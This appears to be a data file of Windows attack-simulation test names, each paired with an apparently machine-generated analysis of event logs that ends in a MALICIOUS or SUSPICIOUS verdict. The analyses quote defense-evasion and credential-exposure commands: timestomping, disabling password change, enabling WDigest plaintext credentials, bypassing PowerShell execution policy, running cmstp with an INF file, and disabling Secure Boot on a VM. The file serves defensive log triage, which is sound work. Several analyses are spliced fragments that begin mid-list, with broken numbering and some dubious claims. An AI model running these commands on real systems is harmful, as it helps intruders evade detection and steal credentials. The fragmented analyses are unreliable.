     powershell.exe & {Get-ChildItem ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.006_timestomp.txt"" | % { $_.LastAccessTime = ""01/01/1970 00:00:00"" }}
     ```
     This command employs the technique known as ""timestomp"", which is used to alter file timestamps to evade detection during forensic investigations. The alteration of `LastAccessTime` to a date far in the past (1970) is particularly suspicious.

2. **Sysmon Activity:**
   - Several processes, including PowerShell (`powershell.exe`), wevtutil.exe, and conhost.exe, executed in quick succession, with PowerShell showing activity consistent with the timestomp technique. The frequent invocation of `wevtutil.exe` could suggest attempts to manipulate or query Windows event logs, an activity often associated with obfuscation or anti-forensic techniques.

3. **User & Privilege Details:**
   - The logs reflect that the activity was performed under the user `SERVER002\admin_test`, using high integrity levels. This indicates admin-level access, which could facilitate impactful changes or data retrieval/manipulation.

4. **Command and Execution Patterns:**
   - The observed invocation pattern (`whoami.exe`, `hostname.exe`, `svchost.exe`) alludes to reconnaissance activity, where an attacker might be assessing access and system identity.

### Assessment:
The combination of PowerShell invocation modifying file timestamps, execution of utility tools possibly to tamper with event logs (`wevtutil.exe`), and process flows typical of reconnaissance or evasive actions (e.g., `whoami`, `hostname`) points towards potentially malicious activity. The actor appears to be leveraging administrative privileges to perform operations indicative of stealth and cover activities.

### Threats or Risks Identified:
- **Data Exfiltration Risk:** PowerShell scripts and administrative-level access could read, explore, and exfiltrate sensitive company data.
- **Persistence and Evasion:** Use of timestomp and wevtutil for tampering logs poses long-term risks as it's indicative of attempts to establish persistence or evade detection.

### Guidance:
Immediate actions should include:
1. **Isolate the Device:** To prevent potential spread or further compromise, isolate the affected host from the network.
2. **Deeper Investigation:**
   - Conduct a thorough forensic investigation on the affected machine.
   - Review any similar activities on adjacent machines for lateral movement signs.
3. **Revisit Security Controls:**
   - Enhance monitoring and logging for suspicious use of PowerShell and other administrative tools.
   - Restrict administrative access where unwarranted, and apply the principle of least privilege.

### Resolution:
**MALICIOUS** - The observed logs exhibit clear signs of malicious activity with the use of techniques such as timestomp and potential log manipulation efforts. Immediate action is warranted to contain and further investigate the scope of the compromise."
Disable Windows Error Reporting Settings,"### Detailed Analysis of the Logs

**Suspicious Behavior Identified:**

1. **Time Manipulation (Event ID 4616 and Kernel-General Event ID 1 & 24):**
   - The security logs show multiple time change events on Server002. The time was altered backward which might be a tactic used to bypass security controls or alter timestamps to confuse log analysis. This behavior is inherently suspicious.

2. **Privilege Use (Event ID 4672):**
   - Privileged account (`admin_test`) obtained multiple high-level privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege`). The presence of `SeDebugPrivilege` is particularly notable because it allows code running in any process to read and write the memory of any other process.

3. **Command Execution and Registry Changes (Sysmon Event ID 1):**
   - Execution of `cmd.exe` with registration modification commands aimed at Windows Defender registry values to suppress enhanced notifications is indicative of an attempt to disable or reduce the effectiveness of the native security mechanisms on the system. Specifically, two registry entries were modified which is characteristic of evasion techniques.

4. **Tool Usage (wevtutil, conhost, hostname, whoami):**
   - Repeated execution of Windows command-line tools like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and registry operations by `admin_test` in rapid succession suggest potential reconnaissance, persistence setup, or further tool deployment. The use of `whoami` and `hostname` may indicate the attacker gathering environmental information.

**Analysis Summary:**

There is a series of events that, when considered together, indicate the possibility of a malicious incident:

- The backward change of system time on Server002 suggests attempts to obscure activities and subvert auditing controls.
- High-level administrative activity, especially the granting of multiple privileges all at once, is atypical for standard operations.
- Registry modifications aimed at diminishing Windows Defender's notification capabilities hint at an effort to evade detection measures.
- The sequence of command-line tool execution without clear administrative necessity also raises red flags and is often indicative of an attempt to gather system and user information.

**Resolution: MALICIOUS**

Given the clear indications of time manipulation, unauthorized privilege escalation, attempted evasion of security measures, and reconnaissance activities, the logs contain evidence of malicious activity. Immediate action should be taken to secure the system, audit privileged account activities, and potentially isolate affected systems from the network.

### Recommended Actions:

1. **Containment:**
   - Immediately isolate Server002 from the network to prevent further spread or exfiltration of data.

2. **Investigation:**
   - Conduct a deep forensic analysis on the affected system to determine the full scope of compromise, analyzing additional event logs, filesystem modifications, and possible rootkits or hidden backdoors.

3. **Remediation:**
   - Restore the affected systems from known good backups.
   - Reset passwords for all privileged accounts and review account permissions.
   - Ensure that time synchronization services are properly configured and monitored.

4. **Detection and Monitoring:**
   - Implement stricter logging and monitoring practices to capture privilege usage and system changes.
   - Utilize threat detection solutions capable of identifying similar patterns in real-time.

   - Review and update incident response plans to ensure readiness for future events."
Disable Powershell ETW Provider - Windows,"Based on the provided Windows event logs, several indicators suggest potentially suspicious behavior, but a comprehensive assessment leads to the following analysis:

### Suspicious or Anomalous Behavior

1. **PsExec Usage**:
   - Multiple events indicate the use of `PsExec.exe` from Sysinternals, which is being executed from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\pstools\\PsExec.exe`). PsExec is a legitimate tool for executing processes on remote systems, but its usage is often seen in red-team activities and by adversaries for lateral movement and execution of commands remotely.

2. **Privilege Escalation**:
   - PsExec execution with the `-i -s` flags indicates interaction with the logged-on user's session and running as the System account. This could be an indication of privilege escalation if used improperly.

3. **Command-Line Pattern**:
   - The command executed through PowerShell with an embedded `cmd /c` running another command to `logman update trace` indicates modification of event traces. This could potentially be used for evasion by attackers to hide or manipulate logs related to PowerShell usage.

4. **Installation of Service**:
   - The logs show the installation of a service named `PSEXESVC` on demand, which is typical when PsExec is used. This behavior is legitimate when used for authenticated administrative purposes, but it can be part of malicious activity if unauthorized.

5. **High Privilege Operations**:
   - Most processes related to these operations are executed under the `NT AUTHORITY\SYSTEM`, which has full administrative privileges on the system.

### Evidence of Execution Activities:

- **PowerShell Logs**:
  - PowerShell being called with embedded commands and executable paths often used in obfuscation or compromise scenarios.
  
- **Sysmon Logs**:
  - Detailed tracking of processes related to the suspicious command execution line following the use of PsExec shows a structured process chain.

### Conclusion:

The activities noted are suspicious due to the use of administrative tools and patterns often associated with lateral movement and privilege escalation tactics used by adversaries. However, without additional context such as open tickets for maintenance or expected administrative activities, it's difficult to conclusively determine if this is an authorized activity or an unauthorized intrusion attempt.

### Recommended Action:

- **Resolution**: **SUSPICIOUS**
  - This activity appears suspicious, warranting further investigation to rule out malicious intent. It's prudent to confirm if there was legitimate administrative activity scheduled or conducted by the IT department that would account for these events.
- **Guidance**:
  - Verifying through administrative logs or change tickets if such usage of PsExec and PowerShell aligns with routine updates or troubleshooting.
  - If no legitimate use is confirmed, consider isolating the affected system for deeper forensic analysis to identify potential artifacts or malware presence.
  - Review network traffic for any unusual outbound connections, especially related to potential lateral movement or data exfiltration activities."
Regsvr32 local DLL execution,"In analyzing the provided Windows event logs from the various sources, a few key observations stand out that require attention:

1. **PowerShell and Command Line Usage**: 
   - There is a Sysmon EventID 5 showing the execution of `powershell.exe`, `cmd.exe`, and `wevtutil.exe` by a user `SERVER002\\admin_test`. The usage of PowerShell, command line tools like `cmd.exe`, and Windows event utility (`wevtutil.exe`) can often be benign, but they are also common tools used for malicious purposes due to their powerful capabilities in scripting and system management.
   - A process running `cmd.exe` executes a command to register a DLL using `regsvr32.exe`. This activity (especially the use of `regsvr32.exe`) can be indicative of an attempt to establish persistence or execute potentially malicious DLLs.

2. **DLL Registration**:
   - The command line operation involving `regsvr32.exe` is registering a DLL located in a temporary directory, specifically under a path that suggests an obfuscated or non-standard use (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\bin\\AllTheThingsx86.dll`). This is suspicious as it mimics known techniques used to sideload or execute unauthorized payloads via DLL registration with renamed or obfuscated paths.

3. **Microsoft Edge Update Activity**:
   - There are numerous entries related to Microsoft Edge Update processes running under `NT AUTHORITY\\SYSTEM`, indicating automatic updates. Each `MicrosoftEdgeUpdate.exe` process appears to execute normal operations, such as updates or installations. Despite this high volume of Edge Update logs, without evidence to suggest these processes resulted in malicious installations or tampered binaries, they are expected behaviors for browser updates.

4. **Use of Built-in Windows Binaries**:
   - The log entries also show frequent usage of Windows binaries like `wevtutil.exe` for controlling event logs, which, alongside the registration of DLLs from temporary locations, may suggest malicious intent, such as cleaning up logs to hide tracks or utilizing legitimate binaries to evade detection (a tactic known as Living off the Land Binaries or LOLBins).

**Assessment**:
- The specific combination of events, particularly the use of `regsvr32.exe` with a DLL in a temporary path, suggests a likelihood of suspicious activity. This behavior aligns with known tactics for executing unauthorized and potentially malicious payloads.
- While the repeated `MicrosoftEdgeUpdate.exe` processes and service stops aren't conclusively malicious by themselves, they do add to the noise and can provide cover for other activities potentially missed during quick reviews.

**Guidance**:
- Further investigation is warranted into the processes spawned under `SERVER002\\admin_test`, particularly any scripts or executables run from temporary folders.
- Verify the integrity and legitimacy of the DLL being registered and its source.
- Conduct a broader review of system logs and other hosts to check for similar patterns, considering the potential use of LOLBins and techniques to obfuscate or blend malicious activities with benign system updates.

**Resolution**: SUSPICIOUS

This activity merits deeper investigation to rule out whether the signs point to a deliberate exploitation or can be traced back to a benign, though possibly unconventional, administrative action."

   - A significant number of events revolve around Microsoft Edge Update processes, indicating updates or installations of Microsoft Edge. These records include processes running under NT AUTHORITY\SYSTEM, which is common for service-level tasks.
   - Some processes exhibit behaviors like executing `cmd.exe` and `regsvr32.exe` with DLL registration activities. While the commands appear legitimate, the registration from temporary directories (e.g., ""C:\Users\ADMIN_~1\AppData\Local\Temp"") raises a red flag about potentially unapproved software. This behavior requires further exploration to confirm its legitimacy or identify it as unauthorized.

5. **Security Log:**
   - Many logs illustrate SYSTEM logons and privilege assignments, which are standard for service processes.
   - There are repeated attempts listed under Event ID 5379 related to MicrosoftAccount credential reads, which return an error code. This may be indicative of failed access attempts to specific Windows accounts or services.

### Assessment:
The majority of logs exhibit normal, benign activity associated with system maintenance, security checks, and legitimate Windows service operations. However, specific Sysmon records indicating process executions from temporary directories and subsequent registry operations through `cmd.exe` and `regsvr32.exe` reveal suspicious behavior that warrants further investigation.

### Conclusion:
Based on the entirety of the logs reviewed, the resolution is as follows:

- **SUSPICIOUS** - The presence of PowerShell and `regsvr32.exe` operations from temporary directories indicates potentially suspicious activities that necessitate further review. Although many activities appear benign, these particular events should be investigated to determine if they constitute unauthorized behavior or are part of normal operations possibly missed by security policies.

### Guidance:
- **Immediate Action:**
  - Investigate the command line used to execute `regsvr32.exe` from temporary directories. Determine whether this registration is authorized or stems from malicious activity.
  - Verify the intent behind the PowerShell scripts if possible by correlating them with scheduled tasks, updates, or telemetry processes from trusted sources like Microsoft.
  
- **Further Steps:**
  - Enhance monitoring in EDR tools to flag unusual script executions or system file manipulations, especially from non-standard or temporary directories.
  - Conduct a threat hunt on the system to identify any unknown or unauthorized files, DLLs, or software that could be hiding malicious intent.

   - Such time discrepancies can suggest tampering; however, further context on whether the time adjustments are legitimate or related to system updates is required to delve deeper.

2. **Privileged Logon and Privilege Usage**:
   - Security logs show entries related to high-privileged activities (e.g., Event ID 4672) where a user `admin_test` receives privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others (`SeLoadDriverPrivilege`), which are concerning if not regularly assigned or expected for this user.
   - Such privileges can be indicators of potential privilege escalation attempts.

3. **Suspicious Process Executions**:
   - Multiple sysmon logs (Event ID 1) show the execution of system tools like `cmd.exe` and manipulation of Registry keys related to `Terminal Server` and Remote Desktop Protocol (`RDP`). These events reflect commands run by `admin_test` to alter remote desktop configurations, potentially to maintain persistence or enable unauthorized remote access.
   - Processes like `reg.exe` and command-line usage modifying critical areas without a clear, benign context may signify malicious intent.

4. **Execution of `whoami` and System Utilities by Admin User**:
   - The execution of `whoami.exe` by `admin_test` suggests information gathering by the user, potentially to confirm administrative access. It's known for being used by attackers post-exploitation to verify their access level.
   
5. **EdgeUpdate Processes**:
   - A series of entries related to Microsoft Edge updates (e.g., `MicrosoftEdgeUpdate.exe` processes executed) without a clear indication that these updates are part of scheduled maintenance or normal operations can sometimes be used to mask malicious activity.
   - Although these entries might be benign, it’s worth corroborating with the maintenance schedule or update policy to rule out adversarial use of these legitimate processes.

6. **Registry Manipulation**:
   - Specific use of `cmd.exe` and `reg.exe` entries altering registry values related to RDP settings indicate attempts to possibly backdoor RDP sessions. Such entries without a clear, legitimate context or explanation pose risks for unauthorized access.
   
Based on the unusual time adjustments, high-privilege operations, direct registry manipulation regarding remote access settings, and evidence of potential backdoor or privilege escalation methods in logs, the activity documented in the provided logs warrants significant concern and further investigation.

### **Final Assessment: SUSPICIOUS**

**Suggested Actions**:

   - **Security Logs:** 
     - EventID 4616 indicates a change to the system's time settings. Irregular time adjustments could be legitimate or could point toward attempts to cover tracks of malicious activity, especially since the new time is set before the previous time.
   
   - **System Logs:**
     - Kernel-General event with EventID 1 indicates a time change initiated by `svchost.exe`. While `svchost.exe` is a legitimate Windows process, repeated time changes can suggest attempts to evade detection from certain security measures by altering timestamps.

2. **Potential Credential Dumping:**
   - **Sysmon Logs:**
     - Sysmon EventID 1 shows an execution of `cmd.exe` with a command to modify registry key `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` to enable `UseLogonCredential`.
     - This registry change (setting WDigest/UseLogonCredential to 1) forces the system to store plaintext passwords in memory, potentially allowing attackers to capture credential information using tools like Mimikatz.

3. **Process Execution Context:**
   - Observing process activities, there is `wsmprovhost.exe` launching several key system binaries such as `hostname.exe`, `whoami.exe`, and notably `cmd.exe` for executing the aforementioned suspicious command. The parent process from a Windows Management framework is executing sensitive commands, indicating possible privilege misuse or exploitation.

4. **Repeated Execution of Legitimate Processes:**
   - There are numerous executions related to `MicrosoftEdgeUpdate.exe`. While frequent updates may happen, the volume and rapid sequence could suggest tampering or misuse of a legitimate application to disguise malicious activity. The rapid sequence of executions deserves further scrutiny to ensure they are aligned with regular update behavior.

### Analysis

1. **Use of Windows Utilities**: 
   - Several legitimate Windows utilities like `whoami.exe`, `wevtutil.exe`, and `conhost.exe` are executed. Such usage can be typical for administrative tasks and does not inherently indicate malicious activity. However, frequent spawning of these processes can be a sign of enumeration or log tampering processes often utilized in malicious campaigns.

2. **Suspicious Command Execution**:
   - A `cmd.exe` process was executed with a command to modify registry settings via `reg.exe`. The command line used was:
     ```
     ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /t REG_DWORD /d 1 /f
     ```
     This command alters the registry to disable the ability for the current user to change passwords, which is unusual and can be a tactic used by an attacker to maintain access.

3. **Time Manipulation**:
   - There are logs indicating the system time was adjusted backward multiple times (`EventID 4616` and related `Kernel-General EventID 1`). This could be an attempt to manipulate time-sensitive logs to obfuscate true timestamps of malicious actions.
   
4. **Presence of Elevated Privileges**:
   - The user `SERVER002\admin_test` has privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, and others often targeted for privilege escalation. The acquisition or use of such privileges should be investigated for potential misuse.
   
5. **Edge Update Activity**:
   - Numerous processes relate to the Microsoft Edge Update service, primarily executed under `NT AUTHORITY\SYSTEM`, which suggests regular updates. While this appears benign, ensuring that Edge updates are legitimate is prudent; malware can impersonate legitimate update processes.

### Assessment & Recommendations

- **Indicators of Potential Compromise**:
  - The use of `cmd.exe` to run a registry modification is a significant concern, particularly because it could be leveraged to retain unauthorized access or complicate incident response.
  - The adjustment of system time should be scrutinized closely. It often indicates attempts to cover tracks or confuse incident log timelines.
  
- **Privilege Review**:
  - The privileges granted to `SERVER002\admin_test` should be reviewed to ensure they align with role requirements and there's no escalation beyond what's necessary for job functions.

- **Further Investigation**:
  - Review the reason and context for the time adjustments and ensure they are legitimate. Verify with NTP configuration or time source logs.
  - Any script or spreadsheet with automatic updating capabilities tied to `EdgeUpdate` should be verified for integrity and legitimacy.

### Sysmon Log:
- Frequent executions of common utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` are observed. These are typically benign, but they may warrant further scrutiny as they could be used in process chains involved in suspicious activities.
- **Powershell Execution**: A PowerShell command is executed altering registry entries related to audit policies, specifically modifying `ProcessCreationIncludeCmdLine_Enabled` to 0, which disables the logging of command line arguments for process creation. This is suspicious since it is often leveraged to obfuscate malicious activities (EventID: 17976).

### Windows PowerShell Log:
- Confirms the execution of the PowerShell command seen in the Sysmon log. The modification of audit policy using PowerShell to minimize logging can be indicative of an attempt to evade detection.

### Application Log:
- Multiple entries for service operations related to Microsoft Edge Update, which seem consistent with regular application updates. However, the PowerShell activity and registry changes do not relate to Edge and suggest potential misuse of regular updates to blend malicious activity.

## Assessment
The logs indicate potentially malicious behavior, primarily driven by the suspicious PowerShell command altering audit policies. The frequency and type of executable processes, combined with the registries being changed to obscure audit trails, are common tactics used in maintaining persistence and evading detection.

## Resolution
- **MALICIOUS**: The PowerShell execution to modify audit settings strongly indicates an attempt to avoid tracking potentially malicious activities. Further investigation into the source of these PowerShell commands is advisable, alongside reviewing any subsequent events that might have obscured activities due to the altered audit configurations.

## Guidance
- **Immediate Response**: 
  - Review and potentially reverse the registry modifications to re-enable command line audit logging.
  - Conduct a detailed forensic analysis of the affected host to identify the origin of the PowerShell commands.
  - Analyze network connections and any anomalies possibly correlating to data exfiltration.

- **Long-term Mitigation**: 
  - Enhance monitoring strategies to catch similar attempts of audit modifications.
  - Implement stricter access controls and just-in-time access to reduce misuse of administrative commands.
  - Enhance security training for users to recognize and report unusual system behaviors.

Given these findings, it's paramount to address the situation promptly to prevent further potential compromise. The presence of such activity suggests an active attempt to obfuscate operations within the network."
Disable Remote Desktop Anti-Alias Setting Through Registry,"Upon reviewing the provided Sysmon logs, I conducted an analysis focusing on indicators of malicious activity, which include unusual process executions, command-line arguments, and potential privilege escalation. Here's a detailed breakdown:

### Summary of Observations:

1. **Execution of 'whoami.exe':**
   - The `whoami.exe` process is executed multiple times (Event IDs: 17969, 18000), which is typically legitimate if a user or script wants to verify current user details. The context shows it was run by the user `SERVER002\\admin_test`.

2. **Execution and Command Usage of 'wevtutil.exe':**
   - Multiple instances of `wevtutil.exe` (Event IDs: 17978, 17982, 17990, 17994) were executed by `SERVER002\\admin_test`. This tool is commonly used to query or manage event logs. It could indicate log tampering if used inappropriately in conjunction with suspicious activity.

3. **Registry Modification via 'cmd.exe' and 'reg.exe':**
   - A command was executed to modify the registry (Event IDs: 18005, 18007). The command line `cmd.exe /c reg add ...` adjusts settings related to Terminal Services, which could alter Remote Desktop configurations. This action might be part of a legitimate administrative task, though it can be considered suspicious if performed without authorization.

4. **Microsoft Edge and Related Process Executions:**
   - Several processes related to `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` were executed. These processes (Event IDs: 17973, 17974, 17975) seem to correspond with application updates or installations, typically legitimate if done through trusted channels.

5. **Multiple 'conhost.exe' Executions:**
   - Frequent execution of `conhost.exe` (a console window hosting process for command line interfaces). These are seen accompanying the execution of commands and processes like `whoami.exe` and `wevtutil.exe`.

### Assessment:

- **Suspicious Activity:**
  - The registry modification via command line (Event ID: 18005) warrants further investigation. This type of action can be associated with persistent threats trying to maintain remote access or control over a system.

- **Potentially Malicious Behavior:**
  - The repeated use of `wevtutil.exe` alongside registry modifications could suggest an attempt at log clearing or tampering, often indicative of post-exploitation activities.

- **Benign Activity:**
  - The execution of system utilities like `whoami.exe` and `MicrosoftEdgeUpdate` processes generally appears consistent with ordinary administrative tasks or legitimate software updates, especially if endpoint protection solutions and IT policies approve such applications.

### Final Resolution:

**Resolution: SUSPICIOUS**

The investigation determined that certain activities, particularly the registry modification and multiple uses of `wevtutil.exe`, elevate the suspicion level. Although there is no direct evidence of malicious compromise, these actions could indicate potential misuse or unauthorized configuration changes.

### Recommendations:

1. **Follow-up Investigation:**
   - Verify the legitimacy of registry modifications and the purpose behind them. Check change management records for corresponding administrative activities.

2. **Monitor and Alert:**
   - Set up alerts for abnormal usage patterns of `wevtutil.exe` and similar utilities, known for their dual use in both administrative and attack actions.

3. **User Access Review:**
   - Conduct a thorough review of user activities and permissions for `SERVER002\\admin_test` to ensure they align with their role requirements and authorized tasks.

4. **Endpoint Security:**
   - Ensure endpoint detection and response (EDR) tools are fully operational and updated to detect possible living-off-the-land techniques that exploit built-in Windows utilities."
Change Powershell Execution Policy to Bypass,"### Analysis of Logs:

**1. Time Manipulation:**
- There are several logs indicating time changes. Specifically, the `Microsoft-Windows-Kernel-General` (Event ID: 1) and `Microsoft-Windows-Security-Auditing` (Event ID: 4616) mention time changes from `14:35:31` to `14:35:57`. Time manipulation is often used by malware to hide its activities from logging systems or to avoid timed protections.

**2. Use of PowerShell with Bypass Policy:**
- The Sysmon log (Event ID: 1) details a PowerShell execution with `Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine`. This command modifies the execution policy on the machine to allow scripts to run without restrictions, a common tactic in malicious activities to run scripts that normally would be blocked.

**3. Wevtutil and Conhost Processes:**
- Frequent executions of `wevtutil.exe` and `conhost.exe` are observed. While `wevtutil` is typically used for managing Windows Event Logs, its frequent execution with `conhost.exe` processes is unusual given the context provided. It's indicative of a potential attempt to access or modify event logs.

**4. Unusual Hostname.exe and Whoami.exe Executions:**
- The execution of `hostname.exe` and `whoami.exe` can be related to reconnaissance activities. These are often used by attackers to understand the environment they are in (identifying the system's hostname and user information).

**5. Application and System Logs:**
- The `edgeupdate` service, part of Microsoft Edge's update mechanism, is seen stopping several times in the `Application` logs without any other context. If considered alone, this might seem benign; however, when combined with other suspicious activities, it requires further investigation to rule out misuse.

### Assessment:

The logs exhibit suspicious behavior worthy of further analysis. The time manipulation, PowerShell execution with an execution policy bypass, and frequent use of `wevtutil` suggest potential malicious activity. These behaviors align with tactics used by attackers to cover their tracks, execute unauthorized scripts, and gather information from the compromised system.

### Recommendations:

1. **Investigate Time Changes:**
   - Determine the necessity and origin of time changes. Validate whether these were legitimate administrative actions or unauthorized attempts to mask activities.

2. **Reevaluate PowerShell Policies:**
   - Review and, if necessary, restrict PowerShell execution policies to prevent execution policy bypasses. Monitor and alert on similar usage.

3. **Monitor Log Access:**
   - Investigate the frequent use of `wevtutil`. Ensure access to event logs is tracked and verify that no logs have been deleted or altered unexpectedly.

4. **Conduct Full System Scan:**
   - Perform a comprehensive malware scan on the system to check for any signs of infection or compromise.

5. **Check User Activities:**
   - Verify the actions performed by `SERVER002\\admin_test` to ensure they were authorized and expected. 

With all the aspects considered, the resolution for this scenario is marked as **SUSPICIOUS**; further investigation is required to confirm or deny malicious intent."
Create and start Hyper-V virtual machine,"Based on the provided logs, here is the detailed analysis and assessment:

### Observations:

1. **PowerShell Activity:**
   - There's a PowerShell script execution on `Server002` that involves the creation and manipulation of a virtual machine (VM):
     - Command Line: `powershell.exe & {$VM = ""file VM""; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM}`
   - This activity could be benign if it's part of the system administration tasks but is unusual for a CEO's machine without prior context.

2. **System Clock Changes:**
   - There are events indicating time changes managed by the `svchost.exe` process. Time adjustment itself might not be suspicious if it's due to normal synchronization activities, but frequent or unexpected changes could indicate attempts to evade time-based detection mechanisms.

3. **Sysmon Events:**
   - Microsoft Edge Update appears to be executing frequently which corresponds with typical software update processes.
   - Multiple instances of `conhost.exe` and `whoami.exe` are launched. While `conhost.exe` accompanying legitimate tasks is normal, irregular uses or unexpected high frequency should be scrutinized.
   - There are multiple executions of `wevtutil.exe` associated with the `admin_test` user. `wevtutil` is typically used for event log manipulation, which can be concerning if not part of normal administrative operations.

4. **Potential Malicious Indicators:**
   - The manipulation of a VM and the disabling of secure boot in the PowerShell script is concerning, as it could be used to create an environment for launching malicious activities without affecting the host directly.
   - The activity involving `wevtutil.exe` under a potentially benign or test account like `admin_test` could be alarming as it might suggest attempts to clear logs or cover tracks.

### Assessment:

- The actions observed, particularly the PowerShell command involving VM manipulation and the use of `wevtutil.exe`, suggest potential misuse or unauthorized use, especially if not aligned with regular operations on a CEO's machine.
- The use of PowerShell to manipulate system configurations and create virtual environments, coupled with potential log clearing, could be indicative of a compromise where the attacker is setting up a backdoor or trying to establish persistence.

### Recommendations:

- **Immediate Actions:**
  - Confirm if the PowerShell and virtual machine activities were approved or issued by IT as part of legitimate maintenance or administrative tasks.
  - Check if the `admin_test` account has unauthorized access and if `wevtutil.exe` usage was expected.
  - Review and monitor further activity from similar PowerShell scripts or tasks that disable security features like Secure Boot.
  
- **Mitigation and Monitoring:**
  - Enhance logging and monitoring, especially around PowerShell execution.
  - Ensure that time synchronization is correctly configured and investigate the reasons behind any time changes.
  - Reinforce security on accounts and enforce the principle of least privilege, especially for accounts seen in these logs.

**Resolution:** **SUSPICIOUS** - Logs contain activity that doesn't look right, specifically the usage of PowerShell for VM manipulation and `wevtutil.exe` activities, which needs more investigation to confirm whether it's benign or malicious."
CMSTP Executing Remote Scriptlet,"Upon review of the provided Windows event logs, several entries stand out as potentially indicating suspicious or malicious activity. Below is a detailed analysis of the logs, focusing on any behavior that deviates from typical operational patterns:

1. **Cmd.exe and cmstp.exe Execution:**
   - **EventRecordID 17977, 17978, 17979**: These events show the execution of `cmd.exe` followed by `cmstp.exe` with a specific `.inf` file path.
   - **Command**: `cmd.exe /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.inf""` – This is suspicious because `cmstp.exe` can be exploited for malicious purposes, such as installing unauthorized services or conducting privilege escalation attacks using application-provided INF files.

2. **High Integrity Level Operations:**
   - Several processes, including `cmd.exe`, `cmstp.exe`, `dllhost.exe`, are running with a high integrity level under an admin account (SERVER002\admin_test), indicating they have elevated permissions. This could mean an attacker is attempting to exploit the system using administrative rights.

3. **Edge Update and Unusual Executable Paths:**
   - **Network Traffic and Exe Execution**: Multiple instances of `MicrosoftEdgeUpdate.exe` running from different directories (`C:\Program Files (x86)\Microsoft\Temp`) suggest potential attempts to blend malicious behavior within legitimate Microsoft operations.
   - The execution of files from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\`) is uncommon and potentially suspicious, especially with the repeated launching and registration attempts of `MicrosoftEdgeUpdate.exe` and its derivatives.

4. **Use of Wevtutil and PowerShell:**
   - **EventRecordID 17953, 17957**: The execution of `wevtutil.exe` alongside PowerShell is often used for either querying logs (suspicious if no administrative logging activities are justified) or clearing logs to cover tracks.

5. **User and Process Behavior Anomalies:**
   - A common technique involves querying user information with commands like `whoami.exe`. These could be used for reconnaissance activities.
   - The repetitive starting and stopping of the `Microsoft Edge Update` service with different process paths might indicate attempts to manipulate system services possibly for persistence or avoiding detection.

**Assessment of the Situation:**
- The presence of scripts using `cmstp.exe` with high integrity, along with multiple edge updates from temporary directories and use of `wevtutil` and `PowerShell`, suggest potential tactics for privilege escalation and persistence – common indicators of compromise.

**Resolution: SUSPICIOUS**
- While no definitively malicious activity is shown, the combination of high integrity-level command execution, non-standard use of `cmstp.exe`, and multiple suspicious launch points for Microsoft Edge updates necessitates further investigation.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Conduct a deeper analysis of the `cmstp.exe` execution, extract the `INF` file for further examination.
   - Check the integrity and source of the `MicrosoftEdgeUpdate.exe` files executed from the temporary paths.

2. **System Monitoring:**
   - Implement enhanced monitoring of applications granting admin privileges, particularly those executed from temporary directories.
   - Increase logging and alerting on similar command execution patterns within your environment to quickly identify repeated behaviors.

3. **Remedial Steps:**
   - Consider isolating the affected machine until a full investigation can confirm the system's integrity.
   - Engage endpoints in enhanced malware scanning that can pinpoint other potential undocumented entries resulting from the suspicious activities observed.

Overall, while not conclusive, these logs display enough irregularities to prioritize them for an in-depth security incident review."
Suppress Win Defender Notifications,"Upon reviewing the provided Windows event logs from various sources including Security, Sysmon, System, and Application logs, I have conducted an analysis for indicators of malicious activity. Here is a detailed assessment:

1. **Security Logs:**
   - **Event ID 4672 (Special Privileges Assigned to New Logon):** Observed multiple occurrences where user `admin_test` was assigned high privileges including SeDebugPrivilege, which can be a red flag if unexpected, as it allows a user to debug and potentially manipulate system processes.
   - **Event ID 4624 (Logon):** There are two logon events using NTLM authentication from `DESKTOP-3HL5B2P` associated with `admin_test`, with a type 3 (network) logon. The use of NTLM and network logon may stand out if the user machine usually operates in a different context or protocol, though NTLM is still common in many environments.
   - **Event ID 4634 (Logoff):** A logoff event for `admin_test` shows normal activities surrounding user session management.

2. **Sysmon Logs:**
   - **Process Creation Events:** The execution of `cmd.exe` with arguments to modify Windows Defender settings (`reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration` to suppress notifications) executed by `admin_test` is anomalous. Modifying security settings, especially related to the built-in antivirus without explicit authorization, is suspicious.
   - **Process Execution List:** Use of utilities like `wevtutil`, `hostname.exe`, `whoami.exe`, and suppression of notifications alongside the process tree interactions suggest possible post-exploitation activities. These could be part of normal administrative tasks, but the combination with the registry change heightens suspicion.

3. **System Logs:**
   - **Time Change Events (Event ID 1):** Changes in the system time recorded close to the execution of the `svchost.exe` process. While not inherently malicious, it should be verified if the time change was expected or part of regular maintenance operation.

4. **Application Logs:**
   - **Edge Update Processes:** The logs show Microsoft Edge Update activities. The presence of many `Update` related events appears normal for system maintenance from Edge's automated update mechanism.

**Conclusion and Recommendation:**

The combination of privilege escalation activities (Event ID 4672 with elevated privileges), registry modifications to suppress Windows Defender notifications by `admin_test` using `cmd.exe`, along with the presence of various system-level utilities like `whoami.exe`, `hostname.exe`, executed within a short timeframe, suggest suspicious behavior. While it may be part of legitimate administrative tasks, these actions typically align with tactics used in post-exploitation scenarios.

**Resolution: SUSPICIOUS**

There is not enough definitive evidence of malicious intent, but the actions suggest a security context that requires further investigation:

